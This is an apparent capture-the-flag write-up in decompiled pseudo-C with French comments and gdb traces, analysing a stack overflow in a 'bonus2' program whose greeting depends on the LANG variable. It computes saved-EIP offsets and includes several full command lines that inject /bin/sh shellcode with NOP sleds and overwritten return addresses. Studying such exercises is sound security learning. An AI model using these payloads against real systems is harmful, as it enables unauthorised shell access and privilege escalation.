
char *language;

void greetuser(buf)
{
//ADDRESSE to Save EIP at: 0xbffff2ac
	if (language[0] == 0x1)
	{
		strcpy((void*)0xbffff260, "Hyv\303\244\303\244 p\303\244iv\303\244\303\244 ");
//>>> len("Hyv\303\244\303\244 p\303\244iv\303\244\303\244 ")
//18
//(gdb) p/d 0xbffff2ac-0xbffff260
//$13 = 76
//(gdb) p/d 76-18-40   #(Le strncpy de av[1]ligne 78)
//$17 = 18
//==> A partir de av[2]+18 nous ecrasons save eip
	}
	else if (language[0] == 0x2)
	{
		strcpy((void*)0xbffff260, "Goedemiddag! ");
//>>> len("Goedemiddag! ")
//13
//(gdb) p/d 0xbffff2ac-0xbffff260
//$18 = 76
//(gdb) p/d 76-13-40
//$19 = 23
//==> A partir de av[2]+23 nous ecrasons save eip
	}
	else
	{		
		strcpy((void*)0xbffff260, "Hello ");
//>>> len("Hello ")
//6
//(gdb) p/d 0xbffff2ac-0xbffff260
//$18 = 76
//(gdb) p/d 76-6-40
//$19 = 30
//A partir de av[2]+30 nous ecrasons les 4 derniers bytes de save eip, nous ne pouvons pas ecraser les 4 premiers bytes car a *main+256 nous ne copions que 76 bytes et si nous ne mettons pas nos 40 bytes dans av[1], les deux arguments ne se suivront pas et nous pourrons ecraser que 39 bytes max au lieu des 72 que nous avons besoins pour ecraser completement save eip
// /!\Cela ne me permet pas de resoudre le challenge
//(gdb) x/wx 0xbffff260+76
//0xbffff2ac:     0x08004242
//Je controle les 2 derniers bytes(4242), mais pas les autres et 0800 correspond a une adresse sur la heap et je ne controle rien dessus !
	}
	strcat(0xbffff260, av[2]);//av[2]+18 == 0xbffff2ac (save eip)
// export EXPLOIT=$(python -c "print '\x90' * 400 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'") && export LANG="fi" && ./bonus2 $(python -c 'print "A" * 4000') $(python -c 'print "B" * 18 + "\x78\xf7\xff\xbf"')

//export LANG="fi" && ./bonus2 $(python -c 'print "\x90" * 17 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"') $(python -c 'print "B" * 18 + "\xff\xf4\xff\xbf"')

//export LANG="nl" && ./bonus2 $(python -c 'print "A" * 4000') $(python -c 'print "B" * 23 + "\x78\xf7\xff\xbf"')

//export LANG="nl" && ./bonus2 $(python -c 'print "\x90" * 17 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"') $(python -c 'print "B" * 23 + "\xff\xf4\xff\xbf"')

}

int main(int ac, char **av)
{
//av[1]: 0xbffff53e
//av[2]: 0xbffff733
	if (ac != 3)
		return (1);
	memset((void*)0x08048287, 0, 19);
	strncpy((void*)0xbffff300, av[1], 40);//First string: 0xbffff300+0x28=0xbffff328
	strncpy((void*)0xbffff300+40, av[2], 72);//First string: 0xbffff328 (La suite du strncpy precedent)
	(void*)0xbfffff3c=getenv("LANG");
	if (!memcmp(0xbfffff3c, "fi, 2"))//Le contenu de la e_Var "LANG"
		language = 1;
	else if (!memcmp(0xbfffff3c, "nl", 2))
		language = 2;
	else
		language = 0;
//(gdb) x/wx $edi
//0xbffff2b0:     0xbfffff3c
//(gdb) x/s 0xbfffff3c
//0xbfffff3c:      "fi"
//(gdb) x/wx $esi
//0xbffff300:     0x41414141
	strncpy((void)0xbffff2b0, (void*)0xbffff300, 19*4)//rep movs copie ecx*4 char donc 19*4 char, en gros on copie les 76 premiers bytes des strncpy ligne 78 et 113
	greetuser();
	return (0);
}
